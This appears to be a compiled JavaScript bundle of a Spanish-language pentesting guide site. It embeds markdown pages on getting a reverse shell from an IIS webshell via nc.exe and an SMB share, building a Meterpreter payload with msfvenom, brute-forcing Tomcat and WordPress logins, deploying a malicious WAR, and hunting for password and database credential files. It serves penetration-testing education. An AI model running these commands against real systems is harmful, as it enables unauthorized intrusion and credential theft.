Una vez que tenemos este archivo localizado y copiado en nuestro directorio actual lo que vamos a hacer es en este mismo directorio levantar un servidor con un recurso compartido para posteriormente desde el host donde tenemos el **RCE** apuntar a dicho recurso compartido y ejecutarlo para así conseguir una **Reverse Shell**.

Levantamos un recurso compartido con la herramienta **impacket**

\`\`\`bash
 impacket-smbserver <nombre_recurso> $(pwd) -smb2support # Con $(pwd) le indicamos que levante el servidor en el directório actual.
\`\`\`

Una vez que hayamos iniciado el servidor con nuestro recurso compartido, en nuestra máquina atacando vamos a abrir otra pestaña nueva y vamos a ponernos a la escucha con **Netcat** por el puerto que nosotros queramos para _recibir la conexión y entablar la reverse shell._

\`\`\`bash
sudo nc -nlvp <puerto_escogido> # Escogemos el puerto que queramos Ej: 443,4444,5555, etc.
\`\`\`

Volvemos a la web donde con \`cmdasp\` habíamos conseguido la ejecución remota de comandos, y en la barra donde introduciamos el comando a ejecutar, escribimos lo siguiente:

\`\`\`bash
\\\\<ip_nuestra_máquina>\\<recurso_compartido>\\\\nc.exe -e cmd.exe <ip_nuestra_máquina> <puerto_escucha_netcat> # Ejemplo: \\\\10.10.10.10\\exerecurso\\nc.exe -e cmd.exe 10.10.10.10 443
\`\`\`

Si accedemos a la pestaña donde establecimos la escucha con Netcat, podremos verificar que hemos obtenido una reverse shell. A continuación, es fundamental determinar si la intrusión se ha realizado con privilegios de administrador, el usuario con los máximos permisos en el sistema. En caso contrario, será necesario llevar a cabo pasos adicionales para elevar privilegios.

Para ello, convertiremos la sesión obtenida con Netcat en una sesión de Meterpreter, lo que nos permitirá utilizar Metasploit para la escalada de privilegios. El primer paso en este proceso es generar un archivo ejecutable (.exe) que deberá ejecutarse en la máquina víctima con el fin de establecer la sesión de Meterpreter

\`\`\`bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<nuestra_ip> LPORT=<puerto_escucha> -f exe > shell.exe # Creamos un archivo .exe malicioso para obtener una sesión meterpreter.
\`\`\`

**¿Cómo llevo este archivo a la máquina víctima?**

Pues para realizar este proceso debemos hacer exactamente el mismo procedimiento de antes, levantarnos un servidor con un recurso compartido.

\`\`\`bash
 impacket-smbserver <nombre_recurso> $(pwd) -smb2support # Con $(pwd) le indicamos que levante el servidor en el directório actual.
\`\`\`

Ahora para poder realizar la descarga del recurso compartido lo que debemos hacer es irnos a un directorio dentro de la máquina víctima que nos permita esa descarga de archivos, que en este caso será el directorio **/temp**

\`\`\`bash
copy \\\\<ip_nuestra_máquina>\\\\<nombre_recurso>\\\\shell.exe shell.exe # Accedemos a la carpeta Temp y nos traemos la shell.exe.
\`\`\`

Antes de ejecutar el archivo .exe nos tenemos que poner a la escucha con metasploit:

\`\`\`bash
    msfconsole -q # Iniciar metasploit en modo silencioso.
    use multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST <ip_nuestra_máquina>
    set LPORT <puerto_escogido>
    run
\`\`\`

Una vez que el payload se haya cargado, debemos acceder a la máquina víctima y ejecutar \`shell.exe\` para activar el archivo malicioso y establecer la sesión de Meterpreter.

Ahora que la sesión de Meterpreter está activa, el siguiente paso es determinar las acciones a realizar. Podemos explorar el sistema comprometido, escalar privilegios, mantener el acceso o extraer información relevante, según los objetivos del procedimiento.

Ahora os mostraré una serie de comandos que os serán útiles cuando hayamos ganado esa intrusión como el usuario con máximos privilegios.

## Comandos de interés

\`\`\`bash
meterpreter > getuid # Verificamos si hemos conseguido privilegios máximos
sessions -l # Ver sesiones activas en metasploit.
sessions -v # Mostrar información detallada de las sesiones.
sessions -L # Listar sesiones y sus rutas.
sessions -k <número_sesión> # Eliminar una sesión específica.
sessions -K # Para eliminar todas las sesiones activas. 
\`\`\`

## Enumeración del Sistema

\`\`\`bash
systeminfo # Información básica del sistema
hostname # Información básica del sistema
ver # Versión del sistema operativo
winver # Versión del sistema operativo
\`\`\`

## Información de Usuario y Privilegios

\`\`\`bash
whoami /all # Usuario actual y privilegios
net user # Usuario actual y privilegios
net localgroup administrators # Usuario actual y privilegios
whoami /priv # Usuario actual y privilegios
qwinsta # Listado de usuarios conectados
query user # Listado de usuarios conectados
\`\`\`

## Enumeración de Red

\`\`\`bash
ipconfig /all # Configuración de red
route print # Configuración de red
netstat -ano # Configuración de red
arp -a # Configuración de red
net share # Recursos compartidos
net use # Recursos compartidos
\`\`\`

## Búsqueda de Archivos Sensibles

Directorios críticos a revisar:

* C:\\Users\\[username]\\AppData\\\\
* C:\\Windows\\System32\\config\\\\
* C:\\Program Files\\\\
* C:\\Windows\\Panther\\\\
* C:\\Windows\\repair\\\\

\`\`\`bash
# Búsqueda de archivos sensibles
dir /s /b "C:\\\\*.txt" "C:\\\\*.pdf" "C:\\\\*.doc" "C:\\\\*.docx"
findstr /si password *.txt *.xml *.ini
dir /s /b /a "C:\\\\Users\\\\*pass*.txt" "C:\\\\Users\\\\*pass*.xml" "C:\\\\Users\\\\*pass*.ini"
\`\`\`
`,Di=`## Servidor Web Local en Python

Esto nos será muy util para la transferencia de archivo entre nuestra máquina atacante y nuestra máquina victima, como reverse shells, etc...

\`\`\`bash
python3 -m http.server 80 # Inicia un servidor HTTP básico
\`\`\`

<figure><img src="/pentesting/assets/captura-de-pantalla-2025-02-15-083802.png" alt="Server" width="563"><figcaption><p>Esto veríamos cuando levantamos un servidor y accedemos a el.</p></figcaption></figure>
`,Oi=`## Auditoría de Apache Tomcat – Descubrimiento y Explotación

**Apache Tomcat** es un servidor de aplicaciones ampliamente utilizado para ejecutar aplicaciones web en **Java**. Debido a su popularidad, es un objetivo frecuente en auditorías de seguridad y pruebas de penetración. En esta guía, exploraremos técnicas para **identificar la versión de Tomcat, enumerar usuarios y rutas sensibles, y explotar vulnerabilidades conocidas**.

***

### Identificación de la Versión de Apache Tomcat

Determinar la versión del servidor es fundamental para detectar posibles vulnerabilidades. Podemos hacerlo de varias maneras:

### Reconocimiento con Nmap

\`\`\`bash
nmap -sV --script http-tomcat-enum <url>
\`\`\`

### Reconocimiento con WhatWeb

\`\`\`bash
whatweb -v <url> # Muestra detalles de la versión detectada.
\`\`\`

### Accediendo al Panel de Administración

En muchos casos, la versión de **Tomcat** se puede encontrar directamente en su panel de administración:

\`\`\`bash
http://<ip>:8080
\`\`\`

Si la consola de administración es accesible, generalmente aparece en la página principal o en la sección "Server Status".

***

### Check List - Apache Tomcat

* [ ] /manager/html _(Consola de administración de Tomcat)_
* [ ] /host-manager/html _(Administrador de hosts virtuales)_
* [ ] /examples/ _(Directorio de ejemplos (puede contener código vulnerable)_
* [ ] /docs/ _(Documentación del servidor (posible información sensible)_
* [ ] /conf/tomcat-users.xml _(Archivo de configuración de usuarios)_
* [ ] /logs/ _(Registros del servidor)_
* [ ] /backups/ _(Posibles copias de seguridad accesibles)_

> \\* Importante: Si el acceso a estos directorios no está restringido, puede representar una vulnerabilidad grave.

***

### Enumeración de Usuarios en Apache Tomcat

Tomcat almacena credenciales en \`tomcat-users.xml\`. Si tenemos acceso, podemos enumerar los usuarios configurados:

\`\`\`bash
cat /etc/tomcat*/tomcat-users.xml
\`\`\`

Si no tenemos acceso directo, podemos intentar un escaneo con \`Metasploit\`:

\`\`\`bash
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <url>
set USER_FILE /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
\`\`\`

 Explicación:\\
 \`tomcat_mgr_login\`  Escanea credenciales por defecto de Tomcat.\\
 \`USER_FILE\` y \`PASS_FILE\`  Diccionarios de usuario y contraseña.

***

### Ataque de Fuerza Bruta con Hydra

Si encontramos el panel de login de Tomcat, podemos probar credenciales con **Hydra**:

\`\`\`bash
hydra -L <usernames_wordlists.txt> -P <password_wordlist.txt> <url> http-get /manager/html
\`\`\`

 Explicación:  \`-L\`  Lista de usuarios.\\
 \`-P\`  Diccionario de contraseñas.\\
 \`http-get /manager/html\`  Ataca el login de Tomcat.

**Credenciales por defecto de Tomcat:**

* admin:admin
* tomcat:tomcat
* tomcat:s3cret
* root:root

### Subida de War Malicioso con Metasploit

Si tenemos credenciales válidas en el **Manager**, podemos subir un archivo \`.war\` para obtener acceso remoto.

\`\`\`bash
use exploit/multi/http/tomcat_mgr_deploy 
set RHOSTS <url>
set HTTPUSERNAME <usuario> 
set HTTPPASSWORD <contraseña> 
set PAYLOAD java/meterpreter/reverse_tcp 
set LHOST <tu_ip> 
set LPORT 4444 
exploit
\`\`\`

***
`,ki=`<figure><img src="/pentesting/assets/dalle-2025-02-19-07-47-26-a-dark-cyberpunk-style-hacker-wearing-a-hood-sitting-in-front-of-a-keyboard-with-a-glowing-screen-the-background-is-filled-with-red-and-blue-neon-l.webp" alt="" width="563"><figcaption></figcaption></figure>

## Identificación de la versión de WordPress y sus componentes

**Reconocimiento de servicios en WordPress**

\`\`\`bash
nmap -sV --script http-wordpress-enum <url> # Detección de la versión de WordPress y plugins.
nmap -sV --script "http-wordpress* and not http-wordpress-brute" <url> # Escaneo de vulnerabilidades en WordPress.
nmap -sV --script http-wordpress-users <url> # Enumeración de usuarios de WordPress.
nmap --script=http-wordpress-enum --script-args http-wordpress-enum.root=/ -p 80,443 <URL> # Escaneo completo para confirmar el uso de WordPress.
nmap --script=http-vuln* -p 80,443 <url> # Detección de vulnerabilidades específicas en WordPress y sus plugins.
\`\`\`

También podemos intentar enumerar plugins con la herramienta _curl_:

\`\`\`bash
curl -s -X GET "http://192.168.100.50" | grep -oP 'plugins/\\K.*' | sort -u
\`\`\`

> Es importante verificar automáticamente ciertos directorios durante cualquier escaneo de WordPress.

**Checklist de WordPress**

 Para comprobar si existe un panel de inicio de sesión:

* [ ] url/wp-admin/login.php
* [ ] url/wp-admin/wp-login.php
* [ ] url/wp-login.php

 Otros directorios clave a revisar en cualquier sitio web:

* [ ] url/robots.txt
* [ ] url/sitemap.xml
* [ ] url/CHANGELOG.txt
* [ ] Cuando hayamos logrado la intrusión:&#x20;

    \`\`\`shell-session
    cat wp-config.php | grep 'DB_USER\\|DB_PASSWORD'
    \`\`\`

> Si al acceder al servicio web notamos que no carga correctamente, es posible que se esté utilizando Virtual Hosting. En este caso, deberemos añadir el dominio al que apunta realmente en nuestro archivo **/etc/hosts**. Para ello, agregamos la IP de la web junto con el dominio correspondiente, por ejemplo: \`10.0.0.10 wordpress.htb\`.

### Escaneo básico de WordPress con Metasploit

\`\`\`bash
use auxiliary/scanner/http/wordpress_version # Cargar el módulo.
set RHOSTS <url>
set RPORT 80
set TARGETURI /
run
\`\`\`

### Enumeración de usuarios en WordPress

\`\`\`bash
use auxiliary/scanner/http/wordpress_users_enum
set RHOSTS <url>
set RPORT 80
set TARGETURI /
run
\`\`\`

### Ataque de fuerza bruta con Metasploit

\`\`\`bash
set RHOSTS <url>
set USERNAME <nombre_usuario> # Nombre de usuario objetivo.
set PASS_FILE /usr/share/wordlists/rockyou.txt # Diccionario de contraseñas.
exploit
\`\`\`

### Otras herramientas para auditar WordPress

**WPScan**

**WPScan** es una herramienta especializada en la enumeración y auditoría de sitios basados en **WordPress**. Permite detectar vulnerabilidades, usuarios, plugins y temas instalados.

\`\`\`bash
wpscan --url <url_wordpress> # Análisis básico de WordPress.
wpscan --url <url_wordpress> -e vp,u # Enumeración de plugins vulnerables y usuarios.
wpscan --url <url_wordpress> -e t # Enumeración de temas instalados.
\`\`\`

>  Una buena práctica durante la auditoría de WordPress es revisar el código fuente de la página. Allí podemos encontrar rutas como \`/uploads\`, analizar si hay _directory listing_, identificar temas, plugins y posibles filtraciones de información (_information leakage_), vhosts, entre otros.

>  También es recomendable examinar publicaciones de blogs u otras secciones del sitio web en busca de nombres de usuario que puedan ser utilizados en ataques de fuerza bruta.

Si encontramos nombres de usuario potenciales, debemos almacenarlos en un archivo**.txt** para su posterior análisis o uso como _wordlist_.

### Fuerza bruta en el panel de inicio de sesión de WordPress

**Ataque de fuerza bruta con WPScan**

\`\`\`bash
wpscan --url <url/wp-login.php> -U <username> -P /usr/share/wordlists/rockyou.txt # Uso de diccionario de contraseñas.
wpscan --url <url/wp-login.php> --passwords <ruta_diccionario.txt> --usernames <ruta_usuarios.txt> # Ataque con múltiples usuarios.
\`\`\`

**Ataque de fuerza bruta con Hydra**

\`\`\`bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt <url> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect"
\`\`\`

Ataque a múltiples usuarios:

\`\`\`bash
hydra -L <lista_usuarios.txt> -P <diccionario.txt> <url> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect"
\`\`\`

 Con estos métodos, podemos identificar la versión de WordPress utilizada, detectar plugins y temas instalados, analizar directorios sensibles, localizar paneles de acceso y ejecutar ataques de fuerza bruta para intentar obtener acceso al sistema.

> credenciales de la base de datos MySQL dentro de los archivos de configuración de WordPress:
>
> \`\`\`shell-session
> cat wp-config.php | grep 'DB_USER\\|DB_PASSWORD'
> \`\`\`

[https://www.youtube.com/watch?v=cI27_M5_a4E](https://www.youtube.com/watch?v=cI27_M5_a4E)
`,Ai=[{slug:`enumeration`,title:{es:`Enumeración`,en:`Enumeration`},icon:`search`,introTitle:`Fase de Enumeración`,pages:[{slug:`comandos-de-red`,title:`Comandos de Red`},{slug:`descubrimiento-de-hosts`,title:`Descubrimiento de HOSTS!`},{slug:`dirbuster-fuzzing-web`,title:`Dirbuster - Fuzzing Web`},{slug:`ffuf-fuzzing-web`,title:`Ffuf - Fuzzing Web`},{slug:`feroxbuster`,title:`Feroxbuster - Fuzzing Web`},{slug:`gobuster-fuzzing-web`,title:`Gobuster - Fuzzing Web`},{slug:`nikto-escaner-web`,title:`Nikto - Escaner Web`},{slug:`subfinder`,title:`Subfinder - Subdominios`}]},{slug:`services`,title:{es:`Servicios y Puertos`,en:`Services & Ports`},icon:`server`,introTitle:`Enumeración y Explotación de Servicios`,pages:[{slug:`puerto-21-ftp`,title:`FTP · Puerto 21`},{slug:`puerto-22-ssh`,title:`SSH · Puerto 22`},{slug:`puerto-25-smtp`,title:`SMTP · Puerto 25`},{slug:`puerto-80-443-http-https`,title:`HTTP/HTTPS · Puertos 80/443`},{slug:`puertos-139-445-smb`,title:`SMB / RPC · Puertos 139/445`},{slug:`puerto-1521-oracle-database`,title:`Oracle Database · Puerto 1521`},{slug:`puerto-3306-mysql`,title:`MySQL · Puerto 3306`},{slug:`3389-rdp`,title:`RDP · Puerto 3389`}]},{slug:`web`,title:{es:`Explotación Web`,en:`Web Exploitation`},icon:`globe`,introTitle:`Auditoría y Explotación Web`,pages:[{slug:`drupal-cms`,title:`Drupal - CMS`},{slug:`jenkins`,title:`Jenkins - Tecnology`},{slug:`joomla-cms`,title:`Joomla - CMS`},{slug:`microsoft-iis-webshell-windows`,title:`Microsoft IIS - Webshell - windows`},{slug:`servidor-web-local-en-python`,title:`Servidor Web Local en Python`},{slug:`tomcat`,title:`Tomcat - Tecnology`},{slug:`wordpress-cms`,title:`WordPress - CMS`}]},{slug:`privilege-escalation`,title:{es:`Escalada de Privilegios`,en:`Privilege Escalation`},icon:`arrow-up`,introTitle:`Escalada de Privilegios (PrivEsc)`,pages:[{slug:`linux`,title:`Escala de privilegios en Linux`},{slug:`windows`,title:`Escalada de privilegios en Windows`}]},{slug:`post-exploitation`,title:{es:`Post-Explotación`,en:`Post-Exploitation`},icon:`terminal`,introTitle:`Fase de Post-Explotación`,pages:[{slug:`pivoting`,title:`Pivoting con Metasploit utilizando una máquina Windows`},{slug:`tty`,title:`TTY - Spawning`},{slug:`windows-post-exploitation`,title:`Windows - Post-Explotación`},{slug:`winrm`,title:`WinRM`}]},{slug:`linux`,title:{es:`Linux`,en:`Linux`},icon:`code`,introTitle:`Linux Pentesting Field Guide`,pages:[{slug:`introduccion`,title:`Introducción y Quick Reference`},{slug:`informacion-del-sistema`,title:`Información del sistema`},{slug:`archivos-permisos`,title:`Archivos, búsqueda y permisos`},{slug:`red`,title:`Red y Samba`},{slug:`procesos-texto-shell`,title:`Procesos, texto y shell`}]},{slug:`active-directory`,title:{es:`Active Directory`,en:`Active Directory`},icon:`network`,introTitle:`Active Directory Pentesting`,pages:[{slug:`mapa-de-ataques`,title:`00 · Mapa de Arquitectura de Ataques`},{slug:`introduccion`,title:`01 · Introducción a Active Directory`},{slug:`metodologia`,title:`02 · Metodología y Reconocimiento`},{slug:`enumeracion`,title:`03 · Enumeración (usuarios, grupos, equipos)`},{slug:`ldap`,title:`04 · LDAP Enumeration`},{slug:`smb-sysvol`,title:`05 · SMB, SYSVOL y GPP`},{slug:`kerberos`,title:`06 · Kerberos: AS-REP y Kerberoasting`},{slug:`password-attacks`,title:`07 · Password Attacks`},{slug:`bloodhound`,title:`08 · BloodHound`},{slug:`acl-ace`,title:`09 · ACL / ACE Abuse`},{slug:`gpo`,title:`10 · GPO Abuse`},{slug:`delegation`,title:`11 · Delegation (Unconstrained/Constrained/RBCD)`},{slug:`credential-dumping`,title:`12 · Credential Dumping`},{slug:`dcsync`,title:`13 · DCSync`},{slug:`mimikatz`,title:`14 · Mimikatz y AV/EDR`},{slug:`ntlm-coercion`,title:`15 · NTLM Relay y Coercion`},{slug:`adcs`,title:`16 · ADCS y Shadow Credentials`},{slug:`tickets`,title:`17 · Golden, Silver y Skeleton Key`},{slug:`lateral-movement`,title:`18 · Lateral Movement (PtH/PtT)`},{slug:`mssql-trusts`,title:`19 · MSSQL y Forest Trusts`},{slug:`persistence-opsec`,title:`20 · Persistence y OPSEC`},{slug:`attack-paths`,title:`21 · Attack Paths y Domain Dominance`},{slug:`reference`,title:`22 · Quick Reference y Checklist`}]},{slug:`tools`,title:{es:`Herramientas`,en:`Tools`},icon:`tool`,introTitle:`Herramientas de Seguridad (Tools)`,pages:[{slug:`john-the-ripper`,title:`John the Ripper - HASH`},{slug:`windows-hotfix`,title:`HotFixed`}]}],ji=Object.assign({"./active-directory/_index.md":vr,"./active-directory/acl-ace.md":yr,"./active-directory/adcs.md":br,"./active-directory/attack-paths.md":xr,"./active-directory/bloodhound.md":Sr,"./active-directory/credential-dumping.md":Cr,"./active-directory/dcsync.md":wr,"./active-directory/delegation.md":Tr,"./active-directory/enumeracion.md":Er,"./active-directory/gpo.md":Dr,"./active-directory/introduccion.md":Or,"./active-directory/kerberos.md":kr,"./active-directory/lateral-movement.md":Ar,"./active-directory/ldap.md":jr,"./active-directory/metodologia.md":Mr,"./active-directory/mimikatz.md":Nr,"./active-directory/mssql-trusts.md":Pr,"./active-directory/ntlm-coercion.md":Fr,"./active-directory/password-attacks.md":Ir,"./active-directory/persistence-opsec.md":Lr,"./active-directory/reference.md":Rr,"./active-directory/smb-sysvol.md":zr,"./active-directory/tickets.md":Br,"./enumeration/_index.md":Vr,"./enumeration/comandos-de-red.md":Hr,"./enumeration/descubrimiento-de-hosts.md":Ur,"./enumeration/dirbuster-fuzzing-web.md":Wr,"./enumeration/feroxbuster.md":Gr,"./enumeration/ffuf-fuzzing-web.md":Kr,"./enumeration/gobuster-fuzzing-web.md":qr,"./enumeration/nikto-escaner-web.md":Jr,"./enumeration/subfinder.md":Yr,"./linux/_index.md":Xr,"./linux/archivos-permisos.md":Zr,"./linux/informacion-del-sistema.md":Qr,"./linux/introduccion.md":$r,"./linux/procesos-texto-shell.md":ei,"./linux/red.md":ti,"./post-exploitation/_index.md":ni,"./post-exploitation/pivoting.md":ri,"./post-exploitation/tty.md":ii,"./post-exploitation/windows-post-exploitation.md":ai,"./post-exploitation/winrm.md":oi,"./privilege-escalation/_index.md":si,"./privilege-escalation/linux.md":ci,"./privilege-escalation/windows.md":li,"./services/3389-rdp.md":ui,"./services/_index.md":di,"./services/puerto-1521-oracle-database.md":fi,"./services/puerto-21-ftp.md":pi,"./services/puerto-22-ssh.md":mi,"./services/puerto-25-smtp.md":hi,"./services/puerto-3306-mysql.md":gi,"./services/puerto-80-443-http-https.md":_i,"./services/puertos-139-445-smb.md":vi,"./tools/_index.md":yi,"./tools/john-the-ripper.md":bi,"./tools/windows-hotfix.md":xi,"./web/_index.md":Si,"./web/drupal-cms.md":Ci,"./web/jenkins.md":wi,"./web/joomla-cms.md":Ti,"./web/microsoft-iis-webshell-windows.md":Ei,"./web/servidor-web-local-en-python.md":Di,"./web/tomcat.md":Oi,"./web/wordpress-cms.md":ki}),Mi={};for(let[e,t]of Object.entries(ji)){let n=e.replace(/^\.\//,``).replace(/\.md$/,``);Mi[n]=t}var Ni=Ai,Pi=(e,t)=>Mi[`${e}/${t}`]||null,Fi=e=>Ai.find(t=>t.slug===e)||null,Ii=e=>{let t=(Mi[`${e}/_index`]||``).split(`
`),n=[];for(let e of t){if(/^(#{1,6}\s|\*\*\*|---|\||\s*[-*]\s|\d+\.\s)/.test(e.trim())&&n.length||/^(#{1,6}\s|\*\*\*|---|\|)/.test(e.trim()))break;n.push(e)}return n.join(`
`).trim()};function Li(){return(0,A.jsxs)(`svg`,{width:`16`,height:`16`,viewBox:`0 0 16 16`,fill:`none`,stroke:`currentColor`,strokeWidth:`1.4`,strokeLinecap:`round`,strokeLinejoin:`round`,children:[(0,A.jsx)(`circle`,{cx:`8`,cy:`5.5`,r:`2.5`}),(0,A.jsx)(`path`,{d:`M2.5 14c0-3.038 2.462-5.5 5.5-5.5s5.5 2.462 5.5 5.5`})]})}function Ri(){return(0,A.jsxs)(`svg`,{width:`16`,height:`16`,viewBox:`0 0 16 16`,fill:`none`,stroke:`currentColor`,strokeWidth:`1.4`,strokeLinecap:`round`,strokeLinejoin:`round`,children:[(0,A.jsx)(`rect`,{x:`1.5`,y:`5.5`,width:`13`,height:`8`,rx:`1.5`}),(0,A.jsx)(`path`,{d:`M5.5 5.5V4a1.5 1.5 0 011.5-1.5h2A1.5 1.5 0 0110.5 4v1.5`}),(0,A.jsx)(`line`,{x1:`1.5`,y1:`9.5`,x2:`14.5`,y2:`9.5`})]})}function zi(){return(0,A.jsxs)(`svg`,{width:`16`,height:`16`,viewBox:`0 0 16 16`,fill:`none`,stroke:`currentColor`,strokeWidth:`1.4`,strokeLinecap:`round`,strokeLinejoin:`round`,children:[(0,A.jsx)(`polygon`,{points:`8,2 15,6 8,10 1,6`}),(0,A.jsx)(`path`,{d:`M4 7.8V11.5c0 0 1.5 1.5 4 1.5s4-1.5 4-1.5V7.8`}),(0,A.jsx)(`line`,{x1:`15`,y1:`6`,x2:`15`,y2:`10`})]})}function Bi(){return(0,A.jsxs)(`svg`,{width:`16`,height:`16`,viewBox:`0 0 16 16`,fill:`none`,stroke:`currentColor`,strokeWidth:`1.4`,strokeLinecap:`round`,strokeLinejoin:`round`,children:[(0,A.jsx)(`circle`,{cx:`8`,cy:`8`,r:`6.5`}),(0,A.jsx)(`circle`,{cx:`8`,cy:`8`,r:`3.5`}),(0,A.jsx)(`circle`,{cx:`8`,cy:`8`,r:`1`,fill:`currentColor`,stroke:`none`}),(0,A.jsx)(`line`,{x1:`8`,y1:`1.5`,x2:`8`,y2:`3.5`}),(0,A.jsx)(`line`,{x1:`8`,y1:`12.5`,x2:`8`,y2:`14.5`}),(0,A.jsx)(`line`,{x1:`1.5`,y1:`8`,x2:`3.5`,y2:`8`}),(0,A.jsx)(`line`,{x1:`12.5`,y1:`8`,x2:`14.5`,y2:`8`})]})}function M(){return(0,A.jsxs)(`svg`,{width:`16`,height:`16`,viewBox:`0 0 16 16`,fill:`none`,stroke:`currentColor`,strokeWidth:`1.4`,strokeLinecap:`round`,strokeLinejoin:`round`,children:[(0,A.jsx)(`path`,{d:`M9.5 1.5H4a1 1 0 00-1 1v11a1 1 0 001 1h8a1 1 0 001-1V5.5L9.5 1.5z`}),(0,A.jsx)(`polyline`,{points:`9.5,1.5 9.5,5.5 13.5,5.5`}),(0,A.jsx)(`line`,{x1:`5`,y1:`8`,x2:`11`,y2:`8`}),(0,A.jsx)(`line`,{x1:`5`,y1:`10.5`,x2:`11`,y2:`10.5`}),(0,A.jsx)(`line`,{x1:`5`,y1:`5.5`,x2:`7`,y2:`5.5`})]})}function N(){return(0,A.jsx)(`svg`,{width:`16`,height:`16`,viewBox:`0 0 16 16`,fill:`none`,stroke:`currentColor`,strokeWidth:`1.4`,strokeLinecap:`round`,strokeLinejoin:`round`,children:(0,A.jsx)(`polygon`,{points:`9,1.5 3.5,9 7.5,9 7,14.5 12.5,7 8.5,7`})})}function Vi(){return(0,A.jsxs)(`svg`,{width:`16`,height:`16`,viewBox:`0 0 16 16`,fill:`none`,stroke:`currentColor`,strokeWidth:`1.4`,strokeLinecap:`round`,strokeLinejoin:`round`,children:[(0,A.jsx)(`rect`,{x:`1.5`,y:`3.5`,width:`13`,height:`9`,rx:`1.5`}),(0,A.jsx)(`polyline`,{points:`1.5,4 8,9 14.5,4`})]})}function Hi(){return(0,A.jsxs)(`svg`,{width:`16`,height:`16`,viewBox:`0 0 16 16`,fill:`none`,stroke:`currentColor`,strokeWidth:`1.4`,strokeLinecap:`round`,strokeLinejoin:`round`,children:[(0,A.jsx)(`polyline`,{points:`5,4 1,8 5,12`}),(0,A.jsx)(`polyline`,{points:`11,4 15,8 11,12`}),(0,A.jsx)(`line`,{x1:`9.5`,y1:`2.5`,x2:`6.5`,y2:`13.5`})]})}function Ui(){return(0,A.jsx)(`svg`,{width:`16`,height:`16`,viewBox:`0 0 24 24`,fill:`none`,stroke:`currentColor`,strokeWidth:`1.6`,strokeLinecap:`round`,strokeLinejoin:`round`,children:(0,A.jsx)(`path`,{d:`M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0020 4.77 5.07 5.07 0 0019.91 1S18.73.65 16 2.48a13.38 13.38 0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 005 4.77a5.44 5.44 0 00-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 009 18.13V22`})})}function Wi(){return(0,A.jsxs)(`svg`,{width:`16`,height:`16`,viewBox:`0 0 24 24`,fill:`none`,stroke:`currentColor`,strokeWidth:`1.6`,strokeLinecap:`round`,strokeLinejoin:`round`,children:[(0,A.jsx)(`path`,{d:`M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z`}),(0,A.jsx)(`rect`,{x:`2`,y:`9`,width:`4`,height:`12`}),(0,A.jsx)(`circle`,{cx:`4`,cy:`4`,r:`2`})]})}function Gi(){return(0,A.jsxs)(`svg`,{width:`12`,height:`12`,viewBox:`0 0 16 16`,fill:`none`,stroke:`currentColor`,strokeWidth:`1.4`,strokeLinecap:`round`,strokeLinejoin:`round`,children:[(0,A.jsx)(`path`,{d:`M7 2H2.5A1.5 1.5 0 001 3.5v10A1.5 1.5 0 002.5 15h10A1.5 1.5 0 0014 13.5V9`}),(0,A.jsx)(`polyline`,{points:`10,1 15,1 15,6`}),(0,A.jsx)(`line`,{x1:`6`,y1:`10`,x2:`15`,y2:`1`})]})}function Ki({children:e,size:t=16}){return(0,A.jsx)(`svg`,{width:t,height:t,viewBox:`0 0 16 16`,fill:`none`,stroke:`currentColor`,strokeWidth:`1.4`,strokeLinecap:`round`,strokeLinejoin:`round`,"aria-hidden":`true`,children:e})}function qi(){return(0,A.jsx)(Ki,{size:18,children:(0,A.jsx)(`path`,{d:`M2 4h12M2 8h12M2 12h12`})})}function Ji(){return(0,A.jsx)(Ki,{size:18,children:(0,A.jsx)(`path`,{d:`M3.5 3.5l9 9M12.5 3.5l-9 9`})})}function Yi(){return(0,A.jsxs)(Ki,{children:[(0,A.jsx)(`circle`,{cx:`7`,cy:`7`,r:`4.5`}),(0,A.jsx)(`path`,{d:`M10.5 10.5L14 14`})]})}function Xi(){return(0,A.jsx)(Ki,{children:(0,A.jsx)(`path`,{d:`M10 3L5 8l5 5`})})}function Zi(){return(0,A.jsx)(Ki,{children:(0,A.jsx)(`path`,{d:`M6 3l5 5-5 5`})})}function Qi(){return(0,A.jsxs)(Ki,{children:[(0,A.jsx)(`circle`,{cx:`8`,cy:`8`,r:`6.2`}),(0,A.jsx)(`path`,{d:`M1.8 8h12.4M8 1.8c1.8 2 1.8 10.4 0 12.4M8 1.8c-1.8 2-1.8 10.4 0 12.4`})]})}function $i(){return(0,A.jsx)(Ki,{children:(0,A.jsx)(`path`,{d:`M8 13V3M4 7l4-4 4 4`})})}function ea(){return(0,A.jsxs)(Ki,{children:[(0,A.jsx)(`rect`,{x:`1.8`,y:`2.8`,width:`12.4`,height:`10.4`,rx:`1.6`}),(0,A.jsx)(`path`,{d:`M4.5 6l2 2-2 2M8.5 10h3`})]})}function ta(){return(0,A.jsx)(Ki,{children:(0,A.jsx)(`path`,{d:`M10.5 2.5a3 3 0 00-3.8 3.8l-4.3 4.3a1.2 1.2 0 001.7 1.7l4.3-4.3a3 3 0 003.8-3.8L10.2 4.3 9 5.5 7.8 4.3 9 3z`})})}function na(){return(0,A.jsx)(Ki,{children:(0,A.jsx)(`path`,{d:`M2.5 2.8h4.3c.9 0 1.2.5 1.2 1.3v9.1c0-.8-.3-1.1-1.2-1.1H2.5zM13.5 2.8H9.2c-.9 0-1.2.5-1.2 1.3v9.1c0-.8.3-1.1 1.2-1.1h4.3z`})})}function ra(){return(0,A.jsxs)(Ki,{children:[(0,A.jsx)(`rect`,{x:`2`,y:`2.4`,width:`12`,height:`4.6`,rx:`1.2`}),(0,A.jsx)(`rect`,{x:`2`,y:`9`,width:`12`,height:`4.6`,rx:`1.2`}),(0,A.jsx)(`path`,{d:`M4.4 4.7h.01M4.4 11.3h.01`})]})}function 